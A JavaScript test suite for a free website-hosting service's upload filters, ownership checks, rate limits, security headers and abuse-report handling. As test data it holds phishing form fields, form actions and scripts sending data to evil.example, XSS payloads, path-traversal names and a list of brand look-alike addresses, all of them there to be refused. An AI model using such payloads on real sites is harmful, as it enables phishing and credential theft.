// Free hosting (src/sites.js): address rules, upload checks and abuse filters, sign-in and owner checks, limits,
// serving by host name, the takedown flag and reports. Runs the real Worker (src/index.js) on in-memory R2, KV and
// D1 (SQLite running migrations/sites) with a stubbed Supabase. The uploads are real builder output.

import test from 'node:test';
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import worker from '../src/index.js';
import { slugProblem, htmlProblem, svgProblem, checkFiles, sitesGated, siteHost, badgeHtml, SITES_LIMITS, _resetSiteCaches, _setClock } from '../src/sites.js';
import { FakeD1, FakeR2 } from '../tools/sign/fakes.mjs';
import { templateSite } from '../public/js/website/spec.js';
import { renderPage, sitePages, SITE_JS, HEAD_BOOT } from '../public/js/website/render.js';
import { BASE_CSS } from '../public/js/website/css.js';
import { sitemapXml, robotsTxt, faviconSvg } from '../public/js/website/export.js';

const SCHEMA = new URL('../migrations/sites/0001_init.sql', import.meta.url).pathname;
const ORIGIN = 'https://chucksi.com';
const PNG = new Uint8Array([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0, 0, 0, 13, 73, 72, 68, 82]);
const JPG = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0, 16, 74, 70, 73, 70, 0]);
const enc = new TextEncoder();

class FakeKV {
  constructor() { this.map = new Map(); }
  async get(k) { return this.map.has(k) ? this.map.get(k) : null; }
  async put(k, v) { this.map.set(k, String(v)); }
  async delete(k) { this.map.delete(k); }
}

const USERS = {
  'tok-alice': { id: 'alice-uuid', email_confirmed_at: '2026-10-01T00:00:00Z' },
  'tok-bob': { id: 'bob-uuid', email_confirmed_at: '2026-10-01T00:00:00Z' },
  'tok-new': { id: 'new-uuid', email_confirmed_at: null },
};
for (let i = 0; i < 4; i++) USERS[`tok-u${i}`] = { id: `u${i}-uuid`, confirmed_at: '2026-10-01T00:00:00Z' };

function makeEnv(extra = {}) {
  return { SITES_BUCKET: new FakeR2(), SITES_DB: new FakeD1(SCHEMA), MASSLESS_KV: new FakeKV(), SUPABASE_URL: 'https://sb.test', SUPABASE_PUBLISHABLE_KEY: 'pk', ...extra };
}

let realFetch;
test.before(() => {
  realFetch = globalThis.fetch;
  globalThis.fetch = async (url, init = {}) => {
    const u = String(url);
    if (u === 'https://sb.test/auth/v1/user') {
      const tok = (new Headers(init.headers).get('authorization') || '').replace(/^Bearer /, '');
      const user = USERS[tok];
      return user ? Response.json(user) : new Response('{}', { status: 401 });
    }
    if (u.includes('raw.githubusercontent.com')) {
      const path = new URL(u).pathname.split('/public/')[1];
      try { return new Response(await readFile(new URL(`../public/${path}`, import.meta.url))); } catch { return new Response('missing', { status: 404 }); }
    }
    throw new Error(`unexpected fetch ${u}`);
  };
});
test.after(() => { globalThis.fetch = realFetch; _setClock(null); });

/** The files the builder's ZIP export makes for a two-page site (images stubbed with real headers). */
function builderFiles({ email = 'hi@example.com', name = 'Cedar Lawn Co' } = {}) {
  const site = templateSite({ prompt: `A site for ${name}, a lawn care business in Cedar Rapids`, kind: 'business' });
  site.contact.email = email;
  site.seo.url = 'https://cedar-lawn.v2web.site';
  const pages = sitePages(site);
  const opts = { mode: 'zip', src: (s, here) => `${'../'.repeat(here.depth)}assets/img/photo.jpg`, imgInfo: () => ({ w: 1200, h: 800 }), srcset: () => '' };
  const files = pages.map((here) => ({ path: `${here.path}index.html`, data: renderPage(site, here, opts) }));
  const notFound = renderPage(site, pages[0], opts).replace('<title>', '<title>Not found ');
  files.push(
    { path: '404.html', data: notFound },
    { path: 'assets/style.css', data: `${BASE_CSS.trim()}\n` },
    { path: 'assets/site.js', data: `${SITE_JS}\n` },
    { path: 'assets/img/photo.jpg', data: JPG },
    { path: 'og.jpg', data: JPG },
    { path: 'favicon.svg', data: faviconSvg(site) },
    { path: 'sitemap.xml', data: sitemapXml(site, pages) },
    { path: 'robots.txt', data: robotsTxt(site) },
  );
  return files.map((f) => ({ path: f.path, bytes: typeof f.data === 'string' ? enc.encode(f.data) : f.data }));
}

const FORM_PAGE = 'contact/index.html';
const text = (files, path) => new TextDecoder().decode(files.find((f) => f.path === path).bytes);

function uploadForm(slug, files, extra = {}) {
  const form = new FormData();
  form.append('meta', JSON.stringify({ slug, title: 'Cedar Lawn Co', paths: files.map((f) => f.path), ...extra }));
  files.forEach((f, i) => form.append(`f${i}`, new Blob([f.bytes]), f.path.split('/').pop()));
  return form;
}

async function call(env, method, path, { token, form, json, ip = '203.0.113.7', origin, host = 'chucksi.com', headers = {} } = {}) {
  const h = { 'cf-connecting-ip': ip, ...headers };
  if (token) h.authorization = `Bearer ${token}`;
  if (origin) h.origin = origin;
  let body = form;
  if (json !== undefined) { h['content-type'] = 'application/json'; body = JSON.stringify(json); }
  const res = await worker.fetch(new Request(`https://${host}${path}`, { method, headers: h, body }), env, { waitUntil: () => {} });
  const text = method === 'HEAD' ? '' : await res.text();
  let data = null;
  try { data = JSON.parse(text); } catch { /* html */ }
  return { status: res.status, data, text, headers: res.headers };
}
const visit = (env, slug, path = '/', opts = {}) => call(env, opts.method || 'GET', path, { ...opts, host: slug ? `${slug}.v2web.site` : 'v2web.site' });

// ---------------------------------------------------------------------------------------------

test('addresses: format, reserved names and brand look-alikes', () => {
  for (const ok of ['cedar-lawn', 'ana-ruiz', 'abc', 'pineapple-cafe', 'bankside-bakery', 'the-low-lanterns', 'casa-verde-2', 'x'.repeat(40), 'metalworks', 'citizens-choir'])
    assert.equal(slugProblem(ok), null, ok);
  for (const bad of ['ab', 'x'.repeat(41), '-abc', 'abc-', 'a--b', 'xn--abc', 'ABC', 'under_score', 'dot.ted', 'sp ace', '12345', ''])
    assert.ok(slugProblem(bad), `format: ${bad}`);
  for (const r of ['www', 'mail', 'email', 'autodiscover', 'sip', 'lyncdiscover', 'api', 'admin', 'app', 'chucksi', 'enterpriseregistration', 'msoid'])
    assert.match(slugProblem(r), /reserved|brand/, r);
  for (const b of ['paypal', 'paypal-help', 'paypa1-billing', 'g00gle-docs', 'my-google', 'microsoft365', 'apple-id', 'my-bank', 'secure-login', 'verify-account',
    'wallet-help', 'coinbase-support', 'netflix-renew', 'amazon-orders', 'login', 'signin-now', 'chase-alerts', 'met4mask', 'icloud-find', 'usps-tracking'])
    assert.match(slugProblem(b), /brand, sign-in or payment|reserved/, b);
});

test('pages: builder output passes; phishing patterns are refused', () => {
  const files = builderFiles();
  const index = text(files, FORM_PAGE);
  assert.equal(htmlProblem(index), null);
  for (const f of files.filter((x) => x.path.endsWith('.html'))) assert.equal(htmlProblem(text(files, f.path)), null, f.path);
  assert.ok(index.includes('<meta name="generator" content="Chucksi Website">'));
  assert.ok(index.includes('action="mailto:hi@example.com"'));
  assert.equal(htmlProblem(text(builderFiles({ email: '' }), FORM_PAGE)), null, 'unconnected form');
  const inForm = (inner) => index.replace('</form>', `${inner}</form>`);
  const cases = {
    'no generator tag': index.replace(/<meta name="generator"[^>]*>/, ''),
    'password input': inForm('<input type="password" name="name">'),
    'password autocomplete': inForm('<input name="name" autocomplete="current-password">'),
    'card autocomplete': inForm('<input name="name" autocomplete="cc-number">'),
    'card number field': inForm('<input name="card_number">'),
    'cvv placeholder': inForm('<input name="message" placeholder="CVV">'),
    'unknown field': inForm('<input name="username">'),
    'hidden field': inForm('<input type="hidden" name="name" value="x">'),
    'select': inForm('<select name="name"></select>'),
    'sensitive label text': inForm('<label>Card number</label>'),
    'seed phrase text': inForm('<p>Enter your seed phrase</p>'),
    'external action': index.replace('action="mailto:hi@example.com"', 'action="https://evil.example/collect"'),
    'protocol-relative action': index.replace('action="mailto:hi@example.com"', 'action="//evil.example/collect"'),
    'formaction': inForm('<button formaction="https://evil.example/x">Go</button>'),
    'extra inline script': index.replace('</body>', '<script>fetch("https://evil.example")</script></body>'),
    'external script': index.replace('</body>', '<script src="https://evil.example/x.js"></script></body>'),
    'unclosed script': index.replace('</body>', '<script>alert(1)</body>'),
    'event handler': index.replace('<body>', '<body onload="alert(1)">'),
    'javascript link': index.replace('<body>', '<body><a href="javascript:alert(1)">x</a>'),
    'iframe': index.replace('<body>', '<body><iframe src="https://evil.example"></iframe>'),
    'object': index.replace('<body>', '<body><object data="x.swf"></object>'),
    'meta refresh': index.replace('<head>', '<head><meta http-equiv="refresh" content="0;url=https://evil.example">'),
    'base tag': index.replace('<head>', '<head><base href="https://evil.example/">'),
    'unknown embed': index.replace('<body>', '<body><button data-embed="https://evil.example/login">Play</button>'),
    'malformed tag': index.replace('<body>', '<body><img src=x onerror=alert(1)//"'),
  };
  for (const [name, html] of Object.entries(cases)) assert.ok(htmlProblem(html), name);
  assert.equal(htmlProblem(index.replace('<body>', '<body><button data-embed="https://www.youtube-nocookie.com/embed/abc123?autoplay=1">Play</button>')), null, 'builder embed');
  assert.ok(index.includes(HEAD_BOOT), 'the boot script is the one the CSP allows');
  assert.equal(svgProblem('<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><rect/></svg>'), null);
  for (const svg of ['<svg><script>alert(1)</script></svg>', '<svg onload="x()"></svg>', '<svg><foreignObject/></svg>', '<svg><a href="https://evil.example">x</a></svg>', '<svg><image href="//evil/x.png"/></svg>', 'not svg'])
    assert.ok(svgProblem(svg), svg);
});

test('files: types, names, sizes and the runtime copy', async () => {
  const good = await checkFiles(builderFiles());
  assert.ok(!good.error, good.error);
  const js = good.files.find((f) => f.path === 'assets/site.js');
  assert.equal(new TextDecoder().decode(js.bytes), `${SITE_JS}\n`);
  const swapped = builderFiles().map((f) => (f.path === 'assets/site.js' ? { ...f, bytes: enc.encode('fetch("https://evil.example")') } : f));
  assert.equal(new TextDecoder().decode((await checkFiles(swapped)).files.find((f) => f.path === 'assets/site.js').bytes), `${SITE_JS}\n`, 'uploaded JS is never served');
  const base = builderFiles();
  const bad = {
    'no index': base.filter((f) => f.path !== 'index.html'),
    'exe': [...base, { path: 'setup.exe', bytes: new Uint8Array(10) }],
    'php': [...base, { path: 'login.php', bytes: enc.encode('<?php') }],
    'audio': [...base, { path: 'assets/audio/a.mp3', bytes: new Uint8Array(10) }],
    'other js': [...base, { path: 'assets/evil.js', bytes: enc.encode('1') }],
    'traversal': [...base, { path: '../x.html', bytes: base[0].bytes }],
    'dotfile': [...base, { path: '.htaccess.txt', bytes: enc.encode('x') }],
    'absolute': [...base, { path: '/etc.txt', bytes: enc.encode('x') }],
    'duplicate': [...base, { path: 'INDEX.html', bytes: base[0].bytes }],
    'fake png': [...base, { path: 'assets/img/a.png', bytes: enc.encode('<html>') }],
    'svg script': [...base, { path: 'favicon2.svg', bytes: enc.encode('<svg><script>1</script></svg>') }],
    'bad json': [...base, { path: 'data.json', bytes: enc.encode('{') }],
    'not utf8': [...base, { path: 'notes.txt', bytes: new Uint8Array([0xff, 0xfe, 0xfd]) }],
    'too many': [...base, ...Array.from({ length: SITES_LIMITS.maxFiles }, (_, i) => ({ path: `assets/img/p${i}.png`, bytes: PNG }))],
    'too big': [...base, { path: 'assets/img/big.png', bytes: (() => { const b = new Uint8Array(SITES_LIMITS.maxBytes); b.set(PNG); return b; })() }],
    'phishing page': [...base, { path: 'login/index.html', bytes: enc.encode(text(base, FORM_PAGE).replace('</form>', '<input type="password" name="name"></form>')) }],
  };
  for (const [name, files] of Object.entries(bad)) assert.ok((await checkFiles(files)).error, name);
  assert.equal((await checkFiles(bad['too big'])).status, 413);
  assert.equal((await checkFiles(bad['phishing page'])).status, 422);
});

test('API: sign-in, publish, owner checks, update, list, limits, unpublish', async () => {
  _resetSiteCaches();
  const env = makeEnv();
  const files = builderFiles();
  assert.equal((await call({}, 'GET', '/api/sites/check?slug=abc')).status, 501, 'off without bindings');
  assert.equal((await call(env, 'POST', '/api/sites', { form: uploadForm('cedar-lawn', files) })).status, 401, 'signed out');
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-nobody', form: uploadForm('cedar-lawn', files) })).status, 401, 'bad token');
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-new', form: uploadForm('cedar-lawn', files) })).status, 403, 'unconfirmed email');
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-alice', form: uploadForm('cedar-lawn', files), origin: 'https://evil.example' })).status, 403, 'cross-site');
  assert.equal((await call(env, 'GET', '/api/sites')).status, 401);

  assert.deepEqual((await call(env, 'GET', '/api/sites/check?slug=cedar-lawn')).data, { slug: 'cedar-lawn', available: true, url: 'https://cedar-lawn.v2web.site' });
  assert.equal((await call(env, 'GET', '/api/sites/check?slug=paypal-login')).data.available, false);

  const pub = await call(env, 'POST', '/api/sites', { token: 'tok-alice', form: uploadForm('cedar-lawn', files) });
  assert.equal(pub.status, 201, pub.text);
  assert.equal(pub.data.site.url, 'https://cedar-lawn.v2web.site');
  assert.equal(pub.data.site.version, 1);
  const manifest = JSON.parse(await (await env.SITES_BUCKET.get('sites/cedar-lawn/manifest.json')).text());
  assert.equal(manifest.owner, 'alice-uuid');
  assert.equal(manifest.version, 1);
  assert.ok(manifest.createdAt && manifest.updatedAt && manifest.size > 1000);
  assert.ok(manifest.files['index.html'] && manifest.files['about/index.html'] && manifest.files['assets/img/photo.jpg']);
  assert.ok(await env.SITES_BUCKET.get('sites/cedar-lawn/v1/index.html'));

  // Knowing a published slug never grants permission to overwrite or remove it.
  for (const [token, status] of [[undefined, 401], ['tok-nobody', 401], ['tok-new', 403]]) {
    for (const method of ['PUT', 'DELETE']) {
      const response = await call(env, method, '/api/sites/cedar-lawn', { token, ...(method === 'PUT' ? { form: uploadForm('cedar-lawn', files) } : {}) });
      assert.equal(response.status, status, `${method} rejects ${token || 'guest'}`);
    }
  }
  assert.equal(JSON.parse(await (await env.SITES_BUCKET.get('sites/cedar-lawn/manifest.json')).text()).version, 1, 'rejected requests do not change the live site');

  assert.equal((await call(env, 'GET', '/api/sites/check?slug=cedar-lawn')).data.taken, true);
  const again = await call(env, 'POST', '/api/sites', { token: 'tok-alice', form: uploadForm('cedar-lawn', files) });
  assert.equal(again.status, 409);
  assert.equal(again.data.mine, true);
  const taken = await call(env, 'POST', '/api/sites', { token: 'tok-bob', form: uploadForm('cedar-lawn', files) });
  assert.equal(taken.status, 409);
  assert.ok(!taken.data.mine);
  assert.equal((await call(env, 'PUT', '/api/sites/cedar-lawn', { token: 'tok-bob', form: uploadForm('cedar-lawn', files) })).status, 403, 'not the owner: update');
  assert.equal((await call(env, 'DELETE', '/api/sites/cedar-lawn', { token: 'tok-bob' })).status, 403, 'not the owner: delete');
  assert.equal((await call(env, 'PUT', '/api/sites/nobody-here', { token: 'tok-alice', form: uploadForm('nobody-here', files) })).status, 404);

  // refused uploads
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-bob', form: uploadForm('secure-paypal', files) })).status, 400);
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-bob', form: uploadForm('www', files) })).status, 400);
  const phish = files.map((f) => (f.path === FORM_PAGE ? { ...f, bytes: enc.encode(text(files, FORM_PAGE).replace('</form>', '<input type="password" name="name"></form>')) } : f));
  const p = await call(env, 'POST', '/api/sites', { token: 'tok-bob', form: uploadForm('bobs-garden', phish) });
  assert.equal(p.status, 422);
  assert.match(p.data.error, /Password/);
  assert.equal(await env.SITES_DB.prepare('SELECT COUNT(*) AS n FROM sites WHERE owner = ?').bind('bob-uuid').first('n'), 0);
  const ext = files.map((f) => (f.path === FORM_PAGE ? { ...f, bytes: enc.encode(text(files, FORM_PAGE).replace(/action="mailto:[^"]*"/, 'action="https://evil.example/c"')) } : f));
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-bob', form: uploadForm('bobs-garden', ext) })).status, 422);
  const missing = uploadForm('bobs-garden', files);
  missing.delete('f3');
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-bob', form: missing })).status, 400);

  // republish by the owner: version 2, old files gone
  const edited = files.map((f) => (f.path === 'index.html' ? { ...f, bytes: enc.encode(new TextDecoder().decode(f.bytes).replace('<title>', '<title>v2 ')) } : f)).filter((f) => f.path !== 'og.jpg');
  const up = await call(env, 'PUT', '/api/sites/cedar-lawn', { token: 'tok-alice', form: uploadForm('cedar-lawn', edited) });
  assert.equal(up.status, 200, up.text);
  assert.equal(up.data.site.version, 2);
  assert.ok(!(await env.SITES_BUCKET.get('sites/cedar-lawn/v1/index.html')), 'old version deleted');
  assert.match(await (await env.SITES_BUCKET.get('sites/cedar-lawn/v2/index.html')).text(), /<title>v2 /);
  assert.ok(!JSON.parse(await (await env.SITES_BUCKET.get('sites/cedar-lawn/manifest.json')).text()).files['og.jpg']);

  const list = await call(env, 'GET', '/api/sites', { token: 'tok-alice' });
  assert.equal(list.status, 200);
  assert.deepEqual(list.data.sites.map((s) => [s.slug, s.version, s.status]), [['cedar-lawn', 2, 'live']]);
  assert.equal(list.data.limits.maxSites, 5);
  assert.deepEqual((await call(env, 'GET', '/api/sites', { token: 'tok-bob' })).data.sites, []);

  // five sites per account (IPs vary so the per-IP limit stays out of the way)
  for (let i = 2; i <= 5; i++) assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-alice', ip: `198.51.100.${i}`, form: uploadForm(`alice-site-${i}`, files) })).status, 201, `site ${i}`);
  const sixth = await call(env, 'POST', '/api/sites', { token: 'tok-alice', ip: '198.51.100.9', form: uploadForm('alice-site-6', files) });
  assert.equal(sixth.status, 403);
  assert.match(sixth.data.error, /up to 5 sites/);

  // unpublish frees the address and deletes every file
  const del = await call(env, 'DELETE', '/api/sites/alice-site-5', { token: 'tok-alice' });
  assert.equal(del.status, 200);
  assert.equal((await env.SITES_BUCKET.list({ prefix: 'sites/alice-site-5/' })).objects.length, 0);
  assert.equal((await call(env, 'GET', '/api/sites/check?slug=alice-site-5')).data.available, true);
  assert.equal((await call(env, 'DELETE', '/api/sites/alice-site-5', { token: 'tok-alice' })).status, 404);

  // paused for maintenance
  assert.equal((await call({ ...env, SITES_PAUSED: '1' }, 'POST', '/api/sites', { token: 'tok-bob', form: uploadForm('bobs-garden', files) })).status, 503);
});

test('API: daily publish limits per account and per IP; Turnstile gate', async () => {
  _resetSiteCaches();
  const files = builderFiles();
  const env = makeEnv({ SITES_PER_ACCOUNT_DAILY: '2', SITES_PER_IP_DAILY: '3' });
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-u0', ip: '192.0.2.1', form: uploadForm('limit-one', files) })).status, 201);
  assert.equal((await call(env, 'PUT', '/api/sites/limit-one', { token: 'tok-u0', ip: '192.0.2.2', form: uploadForm('limit-one', files) })).status, 200);
  const over = await call(env, 'PUT', '/api/sites/limit-one', { token: 'tok-u0', ip: '192.0.2.3', form: uploadForm('limit-one', files) });
  assert.equal(over.status, 429, 'account limit');
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-u1', ip: '192.0.2.9', form: uploadForm('limit-two', files) })).status, 201);
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-u2', ip: '192.0.2.9', form: uploadForm('limit-three', files) })).status, 201);
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-u3', ip: '192.0.2.9', form: uploadForm('limit-four', files) })).status, 201);
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-u3', ip: '192.0.2.9', form: uploadForm('limit-five', files) })).status, 429, 'IP limit');
  // the next day the counters start again
  _setClock(() => Date.now() + 86400000);
  assert.equal((await call(env, 'PUT', '/api/sites/limit-one', { token: 'tok-u0', ip: '192.0.2.3', form: uploadForm('limit-one', files) })).status, 200);
  _setClock(null);

  assert.ok(sitesGated('POST', '/api/sites') && sitesGated('PUT', '/api/sites/abc') && sitesGated('POST', '/api/sites/report'));
  assert.ok(!sitesGated('GET', '/api/sites') && !sitesGated('GET', '/api/sites/check') && !sitesGated('DELETE', '/api/sites/abc'));
  const gated = { ...env, TURNSTILE_SITEKEY: 'sk', TURNSTILE_SECRET: 'secret', PASS_KEY: 'k' };
  for (const [m, path] of [['POST', '/api/sites'], ['PUT', '/api/sites/limit-one'], ['POST', '/api/sites/report']]) {
    const r = await call(gated, m, path, { token: 'tok-u0', json: {} });
    assert.equal(r.status, 401, `${m} ${path}`);
    assert.equal(r.data.human, true);
  }
  assert.equal((await call(gated, 'GET', '/api/sites/check?slug=abcd')).status, 200, 'GETs are not gated');
});

test('serving by host: files, headers, badge, redirects, 404s, landing, free and blocked pages', async () => {
  _resetSiteCaches();
  const env = makeEnv();
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-alice', form: uploadForm('cedar-lawn', builderFiles()) })).status, 201);

  assert.deepEqual(siteHost('cedar-lawn.v2web.site'), { kind: 'site', slug: 'cedar-lawn' });
  assert.deepEqual(siteHost('V2WEB.SITE'), { kind: 'apex' });
  assert.deepEqual(siteHost('www.v2web.site'), { kind: 'apex' });
  assert.equal(siteHost('a.b.v2web.site').kind, 'bad');
  assert.equal(siteHost('chucksi.com'), null);
  assert.equal(siteHost('evilv2web.site'), null);

  const home = await visit(env, 'cedar-lawn');
  assert.equal(home.status, 200);
  assert.equal(home.headers.get('content-type'), 'text/html; charset=utf-8');
  const csp = home.headers.get('content-security-policy');
  for (const part of ["default-src 'none'", "form-action 'self'", "frame-ancestors 'none'", "base-uri 'none'", "object-src 'none'", 'https://fonts.googleapis.com', 'https://www.youtube-nocookie.com'])
    assert.ok(csp.includes(part), part);
  const hash = Buffer.from(await crypto.subtle.digest('SHA-256', enc.encode(HEAD_BOOT.slice(8, -9)))).toString('base64');
  assert.ok(csp.includes(`script-src 'self' 'sha256-${hash}'`), 'only the boot script runs inline');
  assert.ok(!csp.includes('unsafe-eval') && !/script-src[^;]*unsafe-inline/.test(csp));
  assert.match(home.headers.get('strict-transport-security'), /max-age=31536000/);
  assert.equal(home.headers.get('x-content-type-options'), 'nosniff');
  assert.equal(home.headers.get('x-frame-options'), 'DENY');
  assert.match(home.headers.get('cache-control'), /must-revalidate/);
  assert.ok(home.text.includes(badgeHtml('cedar-lawn')), 'badge');
  assert.ok(home.text.includes('href="https://chucksi.com/report?site=cedar-lawn"'));
  assert.ok(home.text.indexOf('<v2web-badge') < home.text.lastIndexOf('</body>'));
  assert.match(home.text, /<meta name="generator" content="Chucksi Website">/);

  const etag = home.headers.get('etag');
  assert.equal((await visit(env, 'cedar-lawn', '/', { headers: { 'if-none-match': etag } })).status, 304);
  const head = await visit(env, 'cedar-lawn', '/', { method: 'HEAD' });
  assert.equal(head.status, 200);

  const dir = await visit(env, 'cedar-lawn', '/about?x=1');
  assert.equal(dir.status, 301);
  assert.equal(dir.headers.get('location'), '/about/?x=1');
  const about = await visit(env, 'cedar-lawn', '/about/');
  assert.equal(about.status, 200);
  assert.match(about.text, /href="\.\.\/assets\/style\.css"/);

  const css = await visit(env, 'cedar-lawn', '/assets/style.css');
  assert.equal(css.headers.get('content-type'), 'text/css; charset=utf-8');
  assert.match(css.headers.get('cache-control'), /max-age=600/);
  assert.ok(!css.text.includes('v2web-badge'));
  assert.equal((await visit(env, 'cedar-lawn', '/assets/site.js')).headers.get('content-type'), 'text/javascript; charset=utf-8');
  assert.equal((await visit(env, 'cedar-lawn', '/assets/img/photo.jpg')).headers.get('content-type'), 'image/jpeg');
  assert.equal((await visit(env, 'cedar-lawn', '/sitemap.xml')).headers.get('content-type'), 'application/xml; charset=utf-8');
  assert.equal((await visit(env, 'cedar-lawn', '/robots.txt')).headers.get('content-type'), 'text/plain; charset=utf-8');
  assert.equal((await visit(env, 'cedar-lawn', '/favicon.svg')).headers.get('content-type'), 'image/svg+xml');

  for (const path of ['/nope', '/manifest.json', '/v1/index.html', '/../manifest.json', '/%2e%2e/manifest.json', '/api/sites']) {
    const r = await visit(env, 'cedar-lawn', path);
    assert.equal(r.status, 404, path);
    assert.match(r.text, /<title>Not found /, `the site's own 404 page: ${path}`);
    assert.ok(r.text.includes('<v2web-badge'));
  }
  assert.equal((await visit(env, 'cedar-lawn', '/', { method: 'POST' })).status, 405);

  const free = await visit(env, 'nobody-yet');
  assert.equal(free.status, 404);
  assert.match(free.text, /This address is free/);
  assert.match(free.text, /nobody-yet\.v2web\.site/);
  assert.match(free.text, /https:\/\/chucksi\.com\/website/);
  assert.ok(!(await visit(env, 'paypal-login')).text.includes('paypal-login.v2web.site'), 'no offer for refused names');
  assert.match((await visit(env, 'a.b')).text, /This address is free/);
  for (const host of [null, 'www']) {
    const r = await visit(env, host);
    assert.equal(r.status, 302);
    assert.equal(r.headers.get('location'), 'https://chucksi.com/website');
  }

  // takedown flag
  await env.MASSLESS_KV.put('site-block:cedar-lawn', 'phishing');
  _resetSiteCaches();
  const blocked = await visit(env, 'cedar-lawn');
  assert.equal(blocked.status, 410);
  assert.match(blocked.text, /This site is unavailable/);
  assert.equal((await visit(env, 'cedar-lawn', '/assets/style.css')).status, 410);
  assert.equal((await call(env, 'PUT', '/api/sites/cedar-lawn', { token: 'tok-alice', form: uploadForm('cedar-lawn', builderFiles()) })).status, 403, 'a blocked site cannot be updated');
  assert.equal((await call(env, 'GET', '/api/sites', { token: 'tok-alice' })).data.sites[0].status, 'blocked');
  assert.equal((await call(env, 'DELETE', '/api/sites/cedar-lawn', { token: 'tok-alice' })).status, 200, 'but it can be deleted');
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-bob', form: uploadForm('cedar-lawn', builderFiles()) })).status, 403, 'and the address stays blocked');
  assert.equal((await call(env, 'GET', '/api/sites/check?slug=cedar-lawn')).data.available, false);
  await env.MASSLESS_KV.delete('site-block:cedar-lawn');
  _resetSiteCaches();
  assert.match((await visit(env, 'cedar-lawn')).text, /This address is free/, 'deleted sites are gone');
});

test('reports: validation, storage, flagging, automatic pause, per-IP limit; the /report page', async () => {
  _resetSiteCaches();
  const env = makeEnv();
  assert.equal((await call(env, 'POST', '/api/sites', { token: 'tok-alice', form: uploadForm('cedar-lawn', builderFiles()) })).status, 201);
  assert.equal((await call(env, 'POST', '/api/sites/report', { json: { site: 'cedar-lawn', reason: 'bored' } })).status, 400);
  assert.equal((await call(env, 'POST', '/api/sites/report', { json: { site: 'x', reason: 'phishing' } })).status, 400);
  assert.equal((await call(env, 'POST', '/api/sites/report', { json: { site: 'nobody-yet', reason: 'phishing' } })).status, 404);
  assert.equal((await call(env, 'POST', '/api/sites/report', { json: { site: 'cedar-lawn', reason: 'phishing' }, origin: 'https://evil.example' })).status, 403);
  const r = await call(env, 'POST', '/api/sites/report', { json: { site: 'https://cedar-lawn.v2web.site/about/', reason: 'phishing', details: 'Asks for my bank login', contact: 'me@example.com' } });
  assert.equal(r.status, 200, r.text);
  const row = await env.SITES_DB.prepare('SELECT * FROM site_reports').first();
  assert.equal(row.slug, 'cedar-lawn');
  assert.equal(row.reason, 'phishing');
  assert.equal(row.details, 'Asks for my bank login');
  assert.ok(row.who.startsWith('r:') && !row.who.includes('203.0.113.7'), 'IP is hashed');
  const site = await env.SITES_DB.prepare('SELECT reports, flagged_at FROM sites WHERE slug = ?').bind('cedar-lawn').first();
  assert.equal(site.reports, 1);
  assert.ok(site.flagged_at > 0);
  assert.equal(await env.MASSLESS_KV.get('site-block:cedar-lawn'), null, 'one report does not pause');

  // the same person again does not count twice toward the pause
  for (let i = 0; i < 3; i++) await call(env, 'POST', '/api/sites/report', { json: { site: 'cedar-lawn', reason: 'scam' } });
  assert.equal(await env.MASSLESS_KV.get('site-block:cedar-lawn'), null);
  for (let i = 1; i <= 4; i++) assert.equal((await call(env, 'POST', '/api/sites/report', { ip: `198.51.100.${i}`, json: { site: 'cedar-lawn', reason: 'phishing' } })).status, 200);
  assert.equal(await env.MASSLESS_KV.get('site-block:cedar-lawn'), 'reports', 'five different reporters pause the site');
  assert.equal((await visit(env, 'cedar-lawn')).status, 410);
  assert.equal((await call(env, 'GET', '/api/sites', { token: 'tok-alice' })).data.sites[0].status, 'paused');

  // per-IP report limit
  for (let i = 0; i < SITES_LIMITS.reportsPerIpDaily - 4; i++) await call(env, 'POST', '/api/sites/report', { json: { site: 'cedar-lawn', reason: 'spam' } });
  assert.equal((await call(env, 'POST', '/api/sites/report', { json: { site: 'cedar-lawn', reason: 'spam' } })).status, 429);
  // automatic pausing can be switched off
  const off = makeEnv({ SITES_REPORT_PAUSE: '0' });
  _resetSiteCaches();
  await call(off, 'POST', '/api/sites', { token: 'tok-bob', form: uploadForm('bobs-garden', builderFiles()) });
  for (let i = 1; i <= 6; i++) await call(off, 'POST', '/api/sites/report', { ip: `192.0.2.${i}`, json: { site: 'bobs-garden', reason: 'spam' } });
  assert.equal(await off.MASSLESS_KV.get('site-block:bobs-garden'), null);

  // the report page is a real route on chucksi.com
  const caches = globalThis.caches;
  globalThis.caches = { default: { match: async () => undefined, put: async () => {} } };
  try {
    const page = await worker.fetch(new Request('https://chucksi.com/report?site=cedar-lawn'), { ASSET_REF: 'a'.repeat(40) }, { waitUntil() {} });
    assert.equal(page.status, 200);
    assert.match(await page.text(), /Report a site/);
  } finally {
    globalThis.caches = caches;
  }
});
